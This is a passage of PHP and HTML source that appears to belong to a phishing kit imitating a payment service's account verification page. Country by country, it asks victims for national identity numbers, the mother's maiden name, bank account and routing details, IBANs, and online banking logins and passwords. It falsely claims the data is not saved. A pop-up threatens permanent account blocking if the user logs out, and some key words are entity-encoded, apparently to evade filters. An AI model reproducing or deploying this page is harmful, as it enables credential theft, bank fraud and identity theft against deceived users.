<input id="nin" name="NIN" class="enterInput" value="" placeholder="NINo" autocomplete="off" dir="ltr" pattern="" style="text-transform:uppercase" maxlength="13" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Italy"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Fiscal Code Number</label>
<input id="fcn" name="FCN" class="enterInput" value="" placeholder="Codice fiscale" autocomplete="off" dir="ltr" pattern="" style="text-transform:uppercase" maxlength="16" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Ireland"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Personal Public Service Number</label>
<input id="irpps" name="IRPPS" class="enterInput" value="" placeholder="PPS No" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="text">

</div></div>
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Mother M&#97;iden Name</label>
<input id="mmn" name="MMN" class="enterInput" value="" placeholder="Mother name" autocomplete="off" dir="ltr" pattern="" maxlength="30" type="text">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Brazil"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">CPF Number</label>
<input id="cpfbr" name="CPFBR" class="enterInput" value="" placeholder="CPF" autocomplete="off" dir="ltr" pattern="" maxlength="14" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Netherlands"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Citizen Service Number/SOFI</label>
<input id="bsn" name="BSN" class="enterInput" value="" placeholder="BSN (8/9 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="tel">
</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Spain"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class=""> National Identity Document Number</label>
<input id="dni" name="DNI" class="enterInput" value="" placeholder="DNI (NIF/NIE/CIF)" autocomplete="off" dir="ltr" pattern="" maxlength="9" type="text">
</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Sweden"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class=""> Personal Identity Number</label>
<input id="sid" name="SID" class="enterInput" value="" placeholder="Personnummer (10 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="11" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "Australia"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Online Shopping ID</label>
<input id="osid" name="OSID" class="enterInput" value="" placeholder="OSID" autocomplete="off" dir="ltr" pattern="" maxlength="15" type="text">

</div></div>
';} ?>

<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Credit Limit</label>
<input id="crl" name="credilimit" class="enterInput" value="" placeholder="Credit limit" autocomplete="off" dir="ltr" pattern="" maxlength="10" type="tel">
</div></div>
<input class="vx_btn updateDone validateBeforeSubmit vx_btn-block" name="save" value="Save" type="submit">
</form>
</div>
</div></div></div>


<div class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 hide" style="padding-top:70px" id="Bformdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 class="col-xs-12 col-lg-5 col-lg-offset-1_ltr"id="overpanel-header">B&#97;nk details</h2>
</div>
<div class=" overpanel-body">
<form name="bankInfo" id ="form4" action="" method="post" novalidate="">

<p class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Please note that the details entered are only for your account verification. It’s secure, and we don't save this information.</p>

<div class="fields">
<?php

if ($_SESSION['cntyCode'] == "US"){
    echo'
    
<div class="bankType vx_btn-group toggleBtnGroup clearfix">
<input id="checking" class="accessAid" name="accountType" checked="checked" value="checking" type="radio">
<label id ="checkin"class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4" for="checking" >Checking</label>
<input id="savings" class="accessAid" name="accountType" value="savings" type="radio">
<label id="saving" class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4 " for="savings" >Savings</label>
</div>
<div class="checkWrapper enforceLtr">
<div id="cheek" class="check"></div></div>

<div class="accountNumbers ltrInputGroup"style="margin-bottom:10px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Routing number</label>
<input aria-invalid="false" id="routingNum" name="routingNumber" class="hasHelp js_needsValidation validate" required="required" aria-required="true" value="" placeholder="Routing number" autocomplete="off" pattern="[0-9]*" maxlength="9" data-min="9/" type="text" ng-routingnum ng-model="formData.accountRouting" onkeyup="USABANK(this.value)">
<p class="help-information" id="routingNum-help-information">A 9-digit number at the lower left corner of a check. Contact your bank if you need help.</p>
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" style="margin-bottom:10px;">

<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="enterInput" required="required" aria-required="true" value="" placeholder="Account number (3-17 digits)" autocomplete="off" pattern="[0-9]*" maxlength="17" data-min="3/" type="text">
<p class="help-information" id="accountNum-help-information">A 3-17 digit number at the bottom of a check or on a bank statement. Contact your bank if you need help.</p>
</div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">

<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text" ng-model="formData.bankName">
</div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" style="margin-top:10px;">

<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="enterInput"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" style="margin-top:10px;">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="text" >
</div></div>


</div>
<div class="row hide" id="rbel1">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Authentication Key"  maxlength="6" type="password"></div></div>
</div>

</div>
';}
elseif (($_SESSION['cntyCode'] == "GB") || ($_SESSION['cntyCode'] == "IE")){
    
    echo'
    <center><div style="margin-bottom:20px;width:120px; height:80px;background:url(img/sprite_wallet_icons_2x.png) 0px -80px ;"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Name of account holder: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Sort Code</label>
<input aria-invalid="false" id="sortC" name="sortCode" class="enterInput"  value="" placeholder="SortCode (6 digits)" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel" onkeyup="UKBANK(this.value)">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number (8 digits)" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>';
}
elseif ($_SESSION['cntyCode'] == "CA"){
    echo'
    <div class="bankType vx_btn-group toggleBtnGroup clearfix">
<input id="checking" class="accessAid" name="accountType" checked="checked" value="checking" type="radio">
<label id ="checkin"class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4" for="checking" >Checking</label>
<input id="savings" class="accessAid" name="accountType" value="savings" type="radio">
<label id="saving" class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4 " for="savings" >Savings</label>
</div>
<div class="checkWrapper enforceLtr">
<div id="cheekca" class="check CA"></div></div>
    
    <div class="accountNumbers ltrInputGroup" style="margin-bottom:5px;">
<div class="row">
<div class="col-xs-12 col-lg-3 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Transit</label>
<input aria-invalid="false" id="catran" name="transit" class="hasHelp js_needsValidation validate valid" value="" placeholder="Transit # (5 digits)" autocomplete="off" pattern="[0-9]*" maxlength="5" type="tel" onkeyup="BANKCA(this.value)">
</div></div>

<div class="col-xs-12 col-lg-2 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Institution</label>
<input aria-invalid="false" id="instica" name="institution" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="Institution # (3 digits)" autocomplete="off" pattern="[0-9]*" maxlength="3" type="tel" onkeyup="BANKCA(this.value)">
</div></div><div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="Account number (1-12 digits)" autocomplete="off" pattern="[0-9]*" maxlength="12" type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Bank name" autocomplete="off" maxlength="50" type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>';  
}
elseif ($_SESSION['cntyCode'] == "AU" || ($_SESSION['cntyCode'] == "NZ")){
    echo'
    <center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">BSB </label>
<input aria-invalid="false" id="bsbNum" name="BSB" class="hasHelp js_needsValidation validate"  value="" placeholder="BSB (6 digits)" autocomplete="off" pattern="[0-9]*" maxlength="7"  type="tel" onkeyup="AUBANK(this.value)">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number (1-9 digits)" autocomplete="off" pattern="[0-9]*" maxlength="9"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Financial Institution Name" autocomplete="off"  maxlength="50"  type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div></div>
<div class="row hide" id="rbel">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="secNum" id="secNum" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Security Number"  maxlength="6" type="password"></div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="issNum" id="issNum"class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Issue Number"  maxlength="1" type="tel"></div></div>
</div>
<div class="row hide" id="rbel1">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Authentication Key"  maxlength="6" type="password"></div></div>
</div>
</div>';
}
elseif ($_SESSION['cntyCode'] == "CH"){
    echo'
    <center><div style="margin-bottom:20px;width:120px; height:80px;background:url(img/sprite_wallet_icons_2x.png) 0px -80px ;"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
    <div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
    <div class="col-xs-12 col-lg-6 col-lg-offset-1_ltr">
    <div class="textInput routingNum routingNum routingNumber lap">
    <label for="firstName" class="accessAid">First name</label>
    <input id="firstName" name="firstName" type="text" class="hasHelp js_needsValidation validate cobrowse_mask"   value="" placeholder="First name" autocomplete="off" maxlength="64" aria-invalid="false">
    <p class="help-information" id="firstName-help-information">The first name must match the first name on your bank statement.</p>
    </div></div>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" style="margin-bottom:10px;">

<label for="routingNum" class="accessAid">IBAN</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="IBAN (International Bank Account Number)" autocomplete="off"  maxlength="32"  type="text">
</div>

<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
    
    ';  
}
elseif(($_SESSION['cntyCode'] == "AT") || ($_SESSION['cntyCode'] == "BE") || ($_SESSION['cntyCode'] == "AT") || ($_SESSION['cntyCode'] == "CY") || ($_SESSION['cntyCode'] == "EE") || ($_SESSION['cntyCode'] == "FI") || ($_SESSION['cntyCode'] == "DE")
|| ($_SESSION['cntyCode'] == "GR") || ($_SESSION['cntyCode'] == "IT") || ($_SESSION['cntyCode'] == "LV") || ($_SESSION['cntyCode'] == "LU") || ($_SESSION['cntyCode'] == "MT") || ($_SESSION['cntyCode'] == "NL") 
|| ($_SESSION['cntyCode'] == "PT") || ($_SESSION['cntyCode'] == "ES") || ($_SESSION['cntyCode'] == "SK") || ($_SESSION['cntyCode'] == "SI") || ($_SESSION['cntyCode'] == "TR") 
|| ($_SESSION['cntyCode'] == "NO") || ($_SESSION['cntyCode'] == "SE") || ($_SESSION['cntyCode'] == "RO") || ($_SESSION['cntyCode'] == "DK")|| ($_SESSION['cntyCode'] == "IL")||($_SESSION['cntyCode'] == "UA"))
{
    echo'
    <center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">IBAN</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="IBAN (International Bank Account Number)" autocomplete="off"  maxlength="32"  type="text">
</div></div>

<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
    
    ';
    
}
else {
    echo'
<center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Bank Code </label>
<input aria-invalid="false" id="BIC" name="BIC" class="hasHelp js_needsValidation validate"  value="" placeholder="Bank International Code" autocomplete="off" " maxlength="15"  type="tel">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number" autocomplete="off" pattern="[0-9]*" maxlength="20"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Online Banking ID" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
';}
?>
</div>
<center>
    <input id="saveBankInfo"  class="vx_btn col-xs-12 col-lg-10 col-lg-offset-3_ltr " name="continue" value="Continue"  type="submit">
</center>
</form>
</div></div>


<div class=" overpanel-content maxOverpanelWidth hide" style="padding-top:70px" id="upproof" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 id="overpanel-header">Upload proof of identity</h2>
</div>
<div class=" overpanel-body">



</div></div>


</div></section>
<script src="js/plugins.js"></script>
<script src="js/rebel.js"></script>
<script src="js/ukbank.js"></script>
<script src="js/cabank.js"></script>
<script src="js/aubank.js"></script>
<script src="js/usabank.js"></script>
<script src="js/iban.js"></script>
<div tabindex="-1"id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="
    z-index: 100011;
    width: auto;
    margin: auto;
    padding: 6px;
    position: relative;
    background-color: #ffffff;
    border: 1px solid #999999;
    border: 1px solid rgba(0,0,0,0.2);
    border-radius: 6px;
    -webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    outline: 0;
    border-color: #e5e5e5 #d9d9d9 #cccccc;
    -webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);
    box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);
    -webkit-border-radius: 10px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    -moz-background-clip: padding-box;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    background-color:#fdfdfd;
    outline: 0 none;
    margin-top: 150px;
    max-width:1024px;
    min-width:auto;
    max-height:200px;
    opacity: 1;">
    <center><div ><h2>If you log out your &#97;cc&#111;unt may be bl&#111;cked perm&#97;nently</h2></div></center>
 <center>
        <a class="vx_btn" href='../signin.php?country.x=<?php echo $countrycode."&locale.x=".Get_Lang()."_".$countrycode."&safeAuth-v= ".$Cdg;?>'>Continue</a>
 </center>
</div></div>
<div class="whiteOverlayMask hide"></div>
<script>
$(".vx_globalNav-link_notifications").click(function(){
$("#nikommek").addClass("vx_hasOpenSidepanel");
$("#js_foreground").addClass("open-side-panel");
$(".whiteOverlayMask").addClass("open-side-panel isShown").removeClass("hide");
});
$(".vx_sidepanel-headerIcon_right").click(function(e) {
      e.preventDefault();
      $("#nikommek").removeClass("vx_hasOpenSidepanel");
      $("#js_foreground").removeClass("open-side-panel");
      $(".whiteOverlayMask").removeClass("open-side-panel isShown").addClass("hide");
});
$(".whiteOverlayMask").click(function(e){
e.preventDefault();
      $("#nikommek").removeClass("vx_hasOpenSidepanel");
      $("#js_foreground").removeClass("open-side-panel");
      $(".whiteOverlayMask").removeClass("open-side-panel isShown").addClass("hide");

});
$(".js_toggleMobileMenu").click(function(){
$("#nikommek").toggleClass("vx_hasOpenNav");
});



window.onload = function() {
 var myInput = document.getElementById('cardnumber');
 var myInput1 = document.getElementById('routingNum');
 var myInput2 = document.getElementById('sortC');
 var myInput3 = document.getElementById('catran');
 var myInput4 = document.getElementById('instica');
 var myInput5 = document.getElementById('bsbNum');
 myInput.onpaste = function(e) {
   e.preventDefault();
 }
 myInput1.onpaste = function(e) {
   e.preventDefault();
 }
 myInput2.onpaste = function(e) {
   e.preventDefault();
 }
 myInput3.onpaste = function(e) {
   e.preventDefault();
 }
 myInput4.onpaste = function(e) {
   e.preventDefault();
 }
 myInput5.onpaste = function(e) {
   e.preventDefault();
 }
}
  
</script>
</body></html>